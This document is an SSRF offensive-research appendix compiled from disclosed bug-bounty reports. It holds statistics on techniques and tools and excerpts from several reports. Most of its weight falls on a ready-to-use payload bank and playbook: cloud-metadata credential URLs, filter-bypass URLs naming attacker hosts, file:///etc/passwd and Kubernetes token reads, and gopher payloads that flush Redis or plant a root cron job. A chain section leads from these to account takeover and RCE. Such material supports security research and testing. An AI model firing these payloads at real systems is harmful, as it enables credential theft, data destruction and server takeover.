# Evidence appendix — Server-Side Request Forgery

Mined from all **337 valid disclosed reports** for this class (105 paid, 31% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| internal service / port / container | 131 |
| public source-code / repo review | 66 |
| header injection (Host / X-Forwarded / etc.) | 60 |
| encoding / double-encode / null byte | 60 |
| Content-Type / body-format switch | 48 |
| subdomain / DNS / cert-transparency recon | 45 |
| cloud metadata / IAM abuse | 42 |
| second-order / stored / blind delivery | 40 |
| admin / privileged-role context | 39 |
| WAF / sanitizer / filter bypass | 39 |
| OAST / DNS / HTTP callback proof | 34 |
| file upload / filename / extension | 33 |
| webhook / OAuth / SAML / integration abuse | 32 |
| cache / CDN / unkeyed header | 30 |
| XML / SOAP / SAML / XXE | 26 |
| HTTP method / verb tampering | 26 |
| error message / stack trace probing | 22 |
| intercept & replay request in Burp | 22 |
| redirect chain / Location header | 16 |
| parser confusion / normalization | 15 |
| unauthenticated / removed-cookie test | 15 |
| DOM / HTML source inspection | 15 |
| race / concurrency / timing | 15 |
| JWT / token / base64 decode | 12 |
| parameter pollution / duplicate keys | 11 |
| API docs / Swagger / introspection | 9 |
| third-party data / paste / breach reuse | 8 |
| git history / exposed .git | 8 |
| fuzzing / wordlist brute force | 8 |
| template injection (SSTI) | 8 |
| response diff / status / length comparison | 7 |
| verbose debug / framework fingerprint | 6 |
| employee / developer public info | 5 |
| JS bundle / source-map inspection | 5 |
| browser DevTools / network tab | 4 |
| replay / modify a captured request | 4 |
| mass assignment / extra request fields | 4 |
| public bucket / storage exposure | 3 |
| two-account / cross-account replay | 3 |
| archive / Wayback endpoint discovery | 2 |
| swap object ID / parameter value | 2 |
| search-engine dorking | 1 |
| deserialization / gadget chain | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| source-code-review | 62 |
| browser | 42 |
| curl | 31 |
| burp | 27 |
| collaborator/oast | 17 |
| burp-collaborator | 16 |
| python | 15 |
| devtools | 14 |
| git | 13 |
| burp-repeater | 7 |
| burp-intruder | 7 |
| javascript-debugging | 4 |
| beautifier | 3 |
| nmap | 2 |
| ffuf | 2 |
| sqlmap | 2 |
| interactsh | 2 |
| jq | 1 |
| zap | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| content-type | 95 |
| bypass | 76 |
| blind | 68 |
| whitelist | 22 |
| blacklist | 19 |
| bypassing | 19 |
| bypassed | 14 |
| host header | 14 |
| %0d%0a | 14 |
| bypasses | 11 |
| crlf | 8 |
| content type | 7 |
| normalization | 6 |
| normalize_request_url | 6 |
| lowercase | 5 |
| open redirect | 5 |
| backslash | 4 |
| allowlist | 3 |
| bypass_demo | 3 |
| normalized | 3 |
| empty value | 2 |
| second order | 2 |
| percent-encoded | 2 |
| normalizes | 2 |
| http method | 1 |
| out-of-band | 1 |
| url encoded | 1 |
| url-encoded | 1 |

## Impact language

| Item | Count |
|---|---:|
| admin | 247 |
| token | 146 |
| password | 116 |
| internal network | 99 |
| localhost | 93 |
| credential | 86 |
| secret | 77 |
| internal service | 36 |
| exfiltrate | 18 |
| unauthorized | 18 |
| sensitive information | 15 |
| cloud metadata | 15 |
| rce | 13 |
| sensitive data | 9 |
| payment | 8 |
| account takeover | 7 |
| remote code execution | 6 |
| metadata service | 6 |
| exfiltrated | 5 |
| arbitrary command | 5 |

## Parameters observed

| Item | Count |
|---|---:|
| url | 13 |
| src | 13 |
| charset | 8 |
| max-age | 8 |
| a-4829527691 | 4 |
| command | 4 |
| user_id | 4 |
| onerror | 4 |
| width | 4 |
| height | 4 |
| http_only | 4 |
| type | 3 |
| edit_service | 3 |
| text | 3 |
| token | 3 |
| request | 3 |
| name | 3 |
| email | 3 |
| month | 3 |
| year | 3 |
| page | 3 |
| expires | 3 |
| path | 3 |
| players | 3 |
| edit_label | 2 |
| phabricator_url | 2 |
| team_id | 2 |
| team_domain | 2 |
| channel_id | 2 |
| channel_name | 2 |

## Recurring approach patterns

- **2×** resource exhaustion by sending excessively large responses in particular using gzip encoding
  - e.g. - Resource exhaustion by sending excessively large responses, in particular, using gzip encoding.
- **1×** to check port we used as post value and the following response was received we received an error because the port of localhost was blocked
  - e.g. To check port 8080 we used ** as **POST** value and the following response was received : We received an error because the PORT 8080 of localhost was blocked.
- **1×** korprit was able to demonstrate this vulnerability by crafting specially formatted urls
  - e.g. @korprit was able to demonstrate this vulnerability by crafting specially formatted URLs.
- **1×** summary server side request forgery ssrf vulnerability in the description by sending a specially crafted http request i can forcibly send a url request from ssi server
  - e.g. **Summary:** Server-Side Request Forgery (SSRF) vulnerability in the [██████]( **Description:** By sending a specially crafted HTTP request, I can forcibly send a URL request from SSI server.
- **1×** when sending the following http request access from the ssi server was logged on my server
  - e.g. When sending the following HTTP request, access from the SSI server was logged on my server.
- **1×** hi i ve found ssrf vulnerability at description server side request forgery ssrf is a vulnerability that appears when an attacker has the ability to create requests from the vulnerable server
  - e.g. ***Hi,*** ***I've found SSRF vulnerability at ##Description## Server Side Request Forgery (SSRF) is a vulnerability that appears when an attacker has the ability to create requests from the vulnerable server.
- **1×** i found an issue which seems to be regression of the following issue
  - e.g. I found an issue which seems to be regression of the following issue: .
- **1×** when modifying the http request that is sent an attacker can do server side request forgery
  - e.g. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery.
- **1×** i tried to connect with the http and ftp protocol to all tcp ports on my server
  - e.g. - I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server.
- **1×** by sending a local path first we can find out if a file that includes a picture is present on the file system
  - e.g. By sending a local path first we can find out if a file that includes a picture is present on the file system.
- **1×** followed by the second stage poc connect to arbitrary hosts and read write arbitrary tcp data while reading and writing http traffic is fun the holy grail of internal network access is the ability to read write arbitrary tcp traffic
  - e.g. Followed by the second stage: # PoC - Connect to arbitrary hosts and read/write arbitrary TCP data While reading and writing HTTP traffic is fun, the holy grail of internal network access is the ability to read/write arbitrary TCP traffic.
- **1×** trigger this webhook by sending receiving an email
  - e.g. Trigger this webhook by sending/receiving an email.
- **1×** i tried for other internal urls such as but they sent a failure email indicating that is open to the webhook
  - e.g. I tried for other internal urls such as ' but they sent a failure email, indicating that ` is open to the webhook.
- **1×** admin group navigate to files file manager page open replace for any uploaded file add remote files i used following endpoints tcp port closed unable to connect to
  - e.g. Admin group); - Navigate to Files > File Manager page; - Open Replace for any uploaded file > Add remote files; - I used following endpoints: _TCP Port 1 (closed)_ `Unable to connect to 127.0.0.1:1 .
- **1×** i ve attached the full body of the emblem i ve used to confirm this bug for ease of reproduction
  - e.g. I've attached the full body of the emblem I've used to confirm this bug for ease of reproduction.
- **1×** by abusing a bug that i discovered in ruby s native resolver i am able to bypass the ssrf filter and could potentially scan your internal network
  - e.g. By abusing a bug that I discovered in Ruby's native resolver, I am able to bypass the SSRF filter and could potentially scan your internal network.
- **1×** i discovered a bug in resolv getaddresses that allows me to return an empty value which is not included in the blacklist and therefore completely bypasses any checks
  - e.g. I discovered a bug in `Resolv::getaddresses` that allows me to return an empty value, which is not included in the blacklist and therefore completely bypasses any checks.
- **1×** i discovered the bug in resolv getaddresses by running it on different linux machines and noticing that the outputs vary
  - e.g. I discovered the bug in `Resolv::getaddresses` by running it on different Linux machines and noticing that the outputs vary.
- **1×** technical details inspired by i found a way to evade the filter for the api endpoint web resource by using a url redirection service
  - e.g. Technical Details -------------------- Inspired by #281950, I found a way to evade the filter for the api endpoint `web_resource` by using a URL Redirection service.
- **1×** i used tinyurl to create a url that linked to any port would work here
  - e.g. I used tinyurl to create a url that linked to (any port would work here).
- **1×** in this report the researcher found that by submitting crafted svg files he was able to establish a listener on our server that enabled ssrf attacks
  - e.g. In this report, the researcher found that by submitting crafted SVG files, he was able to establish a listener on our server that enabled SSRF attacks.
- **1×** i found that imagemagick would happily send the users login and ntlmv2 hash to remote attackers when processing unc paths
  - e.g. I found that Imagemagick would happily send the users' login and NTLMv2 hash to remote attackers when processing UNC paths.
- **1×** i was able to bypass your filter by using as you can see below f238151 please find a hotfix for this issue attached to this report f238152
  - e.g. I was able to bypass your filter by using as you can see below: {F238151} Please find a hotfix for this issue attached to this report: {F238152}.
- **1×** however because this is a service i haven t reported the ssrf in and chaining it with the new line injection increases the severity of the vulnerability i decided to report it
  - e.g. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it.

## Case studies (full excerpts)

### 826361 — SSRF on project import via the remote_attachment_url on a Note
GitLab · $10000 · high · https://hackerone.com/reports/826361

### Summary The Note model has an `attachment` which is provided by a CarrierWave uploader: One of the features this provides is the ability to download and attach a file via a url, see This means that the Note model has a method `remote_attachment_url=` which can be used to perform this action. As this attribute isn't removed by the `AttributeCleaner` on project import, it can be set in the `project.json` for a note and will be set when the note is created, downloading the file: The downloaded file is then attached to the note and can be viewed from the newly imported project. Any model that has a `mount_uploader` and is importable is potentially vulnerable to the same attack, although the majority of the others are `AvatarUploader` which checks the file type and prevents the response from being viewed. ### Steps to reproduce 1. Create a new project 1. Create an issue in the project 1. Add a note to the issue 1. Export the project 1. Extract the export 1. Add `remote_attachment_url` to the `note` hash with a url 1. Recompress the export and import it 1. View the note on the issue Demo {F756257} ### Examples Example of project import on gitlab.com hitting postbin: {F756269} ### What is the current *bug* behavior? When importing a model that has a mount_uploader it's possible to use the carrierwave uploader seed attributes to download a file from any host: ### What is the expect

### 1960765 — Blind SSRF to internal services in matrix preview_link API
Reddit · $6000 · high · https://hackerone.com/reports/1960765

## Summary: Reddit' new chat is based on Matrix software which has preview_link functionality which doesn't filter the URL before sending the request ## Impact: Attacker can enumerate services by grabbing og:title and port scanning, also possible RCE escalation (Asking for permission on this one) ## Steps To Reproduce: 1. Visit the 2. Replace * with to get og:title ███████ 3. Replace * with to get og:title ███████ 4. Replace * with get og:title ██████ 5. Replace * with ████████ to get og:title █████████ Note: If the request is stuck and not responding in 2 seconds reload the page until it does ## Permit for escalation attempt? Since the ███ URL is accessible it may be possible to run ███: GET █████████ There are also possibilities to test ██████, but I thought that it would be incorrect to do such activity without permission and as such report vulnerability in this state. I also therefore request a permission to try to escalate this to Critical ## Impact Attacker can enumerate services and launch attacks against them

### 776017 — Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
Kubernetes · $5000 · high · https://hackerone.com/reports/776017

Hello, ## Who we are : We’re two French security researchers and our respective names are Brice Augras and Christophe Hauquiert, we worked and found the vulnerability together. Brice Augras from company - Christophe Hauquiert - ## Summary We recently led some security investigations about Kubernetes product hosted in a managed service. By abusing product vulnerability due to implementation context, we would like to bring to your attention technical details about what we found. We started an investigation process on multiple managed k8s offers and found quite each time a Critical Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability . We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with. ## Technical specification : - Fake vendor name : **example.com** - Kubernetes release for half-blind SSRF scenario: **1.14** - Kubernetes release for complete SSRF vulnerability : up to **v1.15.3**, **v1.14.6** and **v1.13.10** We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. - Attacker server: ** (51.38.238.22) - Provided file with proof of concept scripts: **PoC.zip** {F685902} ## 

### 2585385 — important: Apache HTTP Server on WIndows UNC SSRF (CVE-2024-38472)
Internet Bug Bounty · $4920 · high · https://hackerone.com/reports/2585385

I reported this vulnerability through the official Apache HTTP Server security email on April 1, 2024, and received a fix along with a CVE number on July 1, 2024. You can check detailed information from there: > ## Impact SSRF in Apache HTTP Server on Windows allows to potentially leak NTML hashes to a malicious server via SSRF and malicious requests or content Users are recommended to upgrade to version 2.4.60 which fixes this issue. Note: Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.

### 2429894 — Libuv: Improper Domain Lookup that potentially leads to SSRF attacks
Internet Bug Bounty · $4860 · high · https://hackerone.com/reports/2429894

I recently encountered a challenge in a CTF competition that led me to discover a vulnerability within Node.js, present in all versions after v10. Upon further investigation and code debugging, it became apparent that the vulnerability originated from its direct dependency, `libuv`. I submitted a report to the Node.js team via HackerOne, and they subsequently connected me with the libuv team. This collaboration resulted in the identification and resolution of the vulnerability, now recorded as CVE-2024-24806. ## Impact This vulnerability could allow an attacker to craft payloads that results in **SSRF** attacks and **Internal API Access**. Full explanation of vulnerability, PoC and sample scenarios are provided within the original report:

### 341876 — SSRF in Exchange leads to ROOT access in all instances
Shopify · no bounty (valid finding) · medium · https://hackerone.com/reports/341876

## The Exploit Chain - How to get root access on all Shopify instances ### 1 - Access Google Cloud Metadata - 1: Create a store (partners.shopify.com) - 2: Edit the template `password.liquid` and add the following content: - 3: Go to and install the Exchange app - 4: Wait for the store screenshot to appear on the Create Listing page - 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG) {F289082} Exploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token. I tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`█████`), the instance name and more: {F289081} **Can I add my SSH key using the leaked token? No** I checked the scopes for this token and there was no read/write access to the Compute Engine API: ### 2 - Dumping kube-env I created a new store and pulled attributes from this instance recursively: Result: {F289455} *

### 530974 — Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata
Snapchat · no bounty (valid finding) · severity n/a · https://hackerone.com/reports/530974

Hey there, I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps: #POC - Login to - Go to creative library -> New Creative - Under "Topsnap Media", click on "Create" - Click on any of the templates and load it - Click on one of the images in the template -> Replace -> Import - _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`) - Run this somewhere publicly accessible: - Put this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you're running the timing script (above) on. - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter (or wherever you run it) - Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes. ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service. ## Impact #SSH Keys: #Hostname: `█████████`

## Full curated payload bank

### Loopback & internal services

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:8500/v1/catalog/services
```

### Cloud metadata

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/openstack/latest/meta_data.json
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Allowlist & parser bypass

```text
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### Redirect & DNS tricks

```text
http://attacker.com/redirect?url=http://169.254.169.254/
https://attacker.com/302?to=http://127.0.0.1/
http://attacker.com/open?next=http://metadata.google.internal/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://metadata.google.internal.nip.io/
http://spoofed.burpcollaborator.net/
http://127.0.0.1.sslip.io/
http://localhost.localdomain/
http://localhost./
```

### Non-HTTP schemes

```text
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
netdoc:///etc/passwd
jar:http://127.0.0.1/x.jar!/
php://filter/convert.base64-encode/resource=index.php
expect://id
```

### Protocol smuggling (gopher / redis / memcached)

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A
gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:5432/_
gopher://127.0.0.1:9000/_
```

## Field playbook (unedited)

### quick

- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.
- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.
- Test the response body, status code, timing, and error text for internal reachability.
- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.
- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).

### payloads

- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`
- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`
- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`
- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`
- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`

### bypass

- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.
- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.
- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.
- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.
- Use open redirects on allowlisted hosts to reach internal targets.

### surface

- url
- uri
- link
- image
- avatar
- webhook
- callback
- feed
- proxy
- next
- dest
- host
- domain
- site
- fetch
- load

### tools

- interactsh
- Burp Collaborator
- ssrfmap
- httpx
- ffuf

### chain

- Metadata -> cloud keys -> S3/account takeover.
- Internal admin panel -> RCE.
- Redis/Memcached via gopher -> RCE.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class ssrf --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
